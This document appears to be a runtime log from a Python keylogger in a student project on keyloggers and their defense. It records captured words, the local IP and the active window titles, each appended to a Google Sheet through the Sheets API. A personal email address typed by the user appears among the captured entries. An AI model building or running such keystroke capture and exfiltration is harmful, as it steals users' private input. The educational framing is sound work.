+2023-04-11 23:38:38,594 Added row: ['webcam', '2023-04-11 23:38:38', '192.168.56.1', 'Random Numbers in Python - GeeksforGeeks - Brave']
+2023-04-11 23:38:39,066 feed
+2023-04-11 23:38:39,526 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:38:39,532 Added row: ['feed', '2023-04-11 23:38:39', '192.168.56.1', 'Random Numbers in Python - GeeksforGeeks - Brave']
+2023-04-11 23:38:41,311 opencv
+2023-04-11 23:38:41,798 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:38:41,803 Added row: ['opencv', '2023-04-11 23:38:41', '192.168.56.1', 'Random Numbers in Python - GeeksforGeeks - Brave']
+2023-04-11 23:39:00,491 open
+2023-04-11 23:39:00,975 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:39:00,983 Added row: ['open', '2023-04-11 23:39:00', '192.168.56.1', 'write on webcam feed opencv - Google Search - Brave']
+2023-04-11 23:39:02,172 camera
+2023-04-11 23:39:02,633 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:39:02,640 Added row: ['camera', '2023-04-11 23:39:02', '192.168.56.1', 'write on webcam feed opencv - Google Search - Brave']
+2023-04-11 23:39:06,757 opencv
+2023-04-11 23:39:07,220 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:39:07,222 Added row: ['opencv', '2023-04-11 23:39:06', '192.168.56.1', 'write on webcam feed opencv - Google Search - Brave']
+2023-04-11 23:39:07,550 and
+2023-04-11 23:39:08,017 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:39:08,025 Added row: ['and', '2023-04-11 23:39:07', '192.168.56.1', 'write on webcam feed opencv - Google Search - Brave']
+2023-04-11 23:39:09,904 and
+2023-04-11 23:39:10,416 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:39:10,419 Added row: ['and', '2023-04-11 23:39:09', '192.168.56.1', 'write on webcam feed opencv - Google Search - Brave']
+2023-04-11 23:39:11,522 display
+2023-04-11 23:39:11,978 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:39:11,981 Added row: ['display', '2023-04-11 23:39:11', '192.168.56.1', 'write on webcam feed opencv - Google Search - Brave']
+2023-04-11 23:39:12,322 text
+2023-04-11 23:39:12,788 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-11 23:39:12,789 Added row: ['text', '2023-04-11 23:39:12', '192.168.56.1', 'write on webcam feed opencv - Google Search - Brave']
+2023-04-12 12:17:41,710 Converted retries value: 3 -> Retry(total=3, connect=None, read=None, redirect=None, status=None)
+2023-04-12 12:17:41,714 Making request: POST https://oauth2.googleapis.com/token
+2023-04-12 12:17:41,724 Starting new HTTPS connection (1): oauth2.googleapis.com:443
+2023-04-12 12:17:42,616 https://oauth2.googleapis.com:443 "POST /token HTTP/1.1" 200 None
+2023-04-12 12:17:42,621 Starting new HTTPS connection (1): sheets.googleapis.com:443
+2023-04-12 12:17:43,374 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-12 12:17:43,702 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-12 12:17:50,347 hello
+2023-04-12 12:17:50,889 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-12 12:17:50,893 Added row: ['hello', '2023-04-12 12:17:50', '192.168.56.1', 'New Tab - Brave']
+2023-04-12 12:18:15,415 gma
+2023-04-12 12:18:15,967 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-12 12:18:15,968 Added row: ['gma', '2023-04-12 12:18:15', '192.168.56.1', 'New Tab - Brave']
+2023-04-12 12:18:33,111 aviraljain58@gmail.com
+2023-04-12 12:18:33,598 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-12 12:18:33,601 Added row: ['aviraljain58@gmail.com', '2023-04-12 12:18:33', '192.168.56.1', 'New Tab - Brave']
+2023-04-12 12:19:22,819 _compiled
+2023-04-12 12:19:23,392 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-12 12:19:23,398 Added row: ['_compiled', '2023-04-12 12:19:22', '192.168.56.1', 'Save As']
+2023-04-12 12:20:24,312 1
+2023-04-12 12:20:24,771 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-12 12:22:10,283 Unhandled exception in listener callback
+Traceback (most recent call last):
+  File "_util\__init__.py", line 228, in inner
+  File "keyboard\_win32.py", line 287, in _process
+  File "_util\__init__.py", line 144, in inner
+  File "keylogs.py", line 104, in on_press
+TypeError: must be str, not NoneType
+2023-04-12 20:11:16,254 Converted retries value: 3 -> Retry(total=3, connect=None, read=None, redirect=None, status=None)
+2023-04-12 20:11:16,257 Making request: POST https://oauth2.googleapis.com/token
+2023-04-12 20:11:16,259 Starting new HTTPS connection (1): oauth2.googleapis.com:443
+2023-04-12 20:11:16,841 https://oauth2.googleapis.com:443 "POST /token HTTP/1.1" 200 None
+2023-04-12 20:11:16,842 Starting new HTTPS connection (1): sheets.googleapis.com:443
+2023-04-12 20:11:17,728 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-12 20:11:18,103 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-12 20:11:22,638 Unhandled exception in listener callback
+Traceback (most recent call last):
+  File "_util\__init__.py", line 228, in inner
+  File "keyboard\_win32.py", line 287, in _process
+  File "_util\__init__.py", line 144, in inner
+  File "keylogs.py", line 104, in on_press
+TypeError: must be str, not NoneType
+2023-04-12 20:12:03,912 Converted retries value: 3 -> Retry(total=3, connect=None, read=None, redirect=None, status=None)
+2023-04-12 20:12:03,914 Making request: POST https://oauth2.googleapis.com/token
+2023-04-12 20:12:03,916 Starting new HTTPS connection (1): oauth2.googleapis.com:443
+2023-04-12 20:12:04,451 https://oauth2.googleapis.com:443 "POST /token HTTP/1.1" 200 None
+2023-04-12 20:12:04,454 Starting new HTTPS connection (1): sheets.googleapis.com:443
+2023-04-12 20:12:04,953 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-12 20:12:05,344 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-12 20:12:14,184 python
+2023-04-12 20:12:14,849 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-12 20:12:14,852 Added row: ['python', '2023-04-12 20:12:14', '192.168.56.1', 'antikeylog.py - Keyloggers and Defense Against Them - Visual Studio Code']
+2023-04-12 20:12:30,023 anti
+2023-04-12 20:12:30,541 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-12 20:12:30,542 Added row: ['anti', '2023-04-12 20:12:30', '192.168.56.1', 'antikeylog.py - Keyloggers and Defense Against Them - Visual Studio Code']
+2023-04-12 20:12:34,051 y
+2023-04-12 20:12:54,711 Converted retries value: 3 -> Retry(total=3, connect=None, read=None, redirect=None, status=None)
+2023-04-12 20:12:54,714 Making request: POST https://oauth2.googleapis.com/token
+2023-04-12 20:12:54,716 Starting new HTTPS connection (1): oauth2.googleapis.com:443
+2023-04-12 20:12:55,357 https://oauth2.googleapis.com:443 "POST /token HTTP/1.1" 200 None
+2023-04-12 20:12:55,359 Starting new HTTPS connection (1): sheets.googleapis.com:443
+2023-04-12 20:12:55,971 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-12 20:12:56,362 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-12 20:13:08,915 y
+2023-04-12 20:14:10,196 Converted retries value: 3 -> Retry(total=3, connect=None, read=None, redirect=None, status=None)
+2023-04-12 20:14:10,197 Making request: POST https://oauth2.googleapis.com/token
+2023-04-12 20:14:10,199 Starting new HTTPS connection (1): oauth2.googleapis.com:443
+2023-04-12 20:14:10,731 https://oauth2.googleapis.com:443 "POST /token HTTP/1.1" 200 None
+2023-04-12 20:14:10,733 Starting new HTTPS connection (1): sheets.googleapis.com:443
+2023-04-12 20:14:11,261 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-12 20:14:11,624 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-12 20:15:11,308 cm
+2023-04-12 20:15:11,794 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-12 20:15:11,798 Added row: ['cm', '2023-04-12 20:15:11', '192.168.56.1', 'antikeylog.py - Keyloggers and Defense Against Them - Visual Studio Code']
+2023-04-12 20:15:19,163 n
+2023-04-12 20:15:19,839 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-12 20:15:19,846 Added row: ['n', '2023-04-12 20:15:19', '192.168.56.1', 'antikeylog.py - Keyloggers and Defense Against Them - Visual Studio Code']
+2023-04-12 20:15:20,264 n
+2023-04-12 20:15:20,876 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-12 20:15:20,878 Added row: ['n', '2023-04-12 20:15:20', '192.168.56.1', 'antikeylog.py - Keyloggers and Defense Against Them - Visual Studio Code']
+2023-04-12 20:15:29,786 y
+2023-04-12 20:17:47,352 Converted retries value: 3 -> Retry(total=3, connect=None, read=None, redirect=None, status=None)
+2023-04-12 20:17:47,354 Making request: POST https://oauth2.googleapis.com/token
+2023-04-12 20:17:47,357 Starting new HTTPS connection (1): oauth2.googleapis.com:443
+2023-04-12 20:17:48,139 https://oauth2.googleapis.com:443 "POST /token HTTP/1.1" 200 None
+2023-04-12 20:17:48,145 Starting new HTTPS connection (1): sheets.googleapis.com:443
+2023-04-12 20:17:48,992 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-12 20:17:49,460 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-12 20:17:53,943 y
+2023-04-12 20:17:54,435 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-12 20:17:58,834 y
+2023-04-12 20:19:44,233 Converted retries value: 3 -> Retry(total=3, connect=None, read=None, redirect=None, status=None)
+2023-04-12 20:19:44,234 Making request: POST https://oauth2.googleapis.com/token
+2023-04-12 20:19:44,236 Starting new HTTPS connection (1): oauth2.googleapis.com:443
+2023-04-12 20:19:44,723 https://oauth2.googleapis.com:443 "POST /token HTTP/1.1" 200 None
+2023-04-12 20:19:44,725 Starting new HTTPS connection (1): sheets.googleapis.com:443
+2023-04-12 20:19:45,887 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-12 20:19:46,516 https://sheets.googleapis.com:443 "GET /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4?includeGridData=false HTTP/1.1" 200 None
+2023-04-12 20:19:55,569 y
+2023-04-12 20:19:56,240 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-12 20:19:56,247 Added row: ['y', '2023-04-12 20:19:55', '192.168.56.1', 'antikeylog.py - Keyloggers and Defense Against Them - Visual Studio Code']
+2023-04-12 20:20:16,592 
+2023-04-12 20:20:17,128 https://sheets.googleapis.com:443 "POST /v4/spreadsheets/1EiYMpl08l5mspXSYZMp9prj38Pexs_uoaqPuhXutju4/values/%27Sheet1%27:append?valueInputOption=RAW&includeValuesInResponse=False HTTP/1.1" 200 None
+2023-04-12 20:20:21,143 y
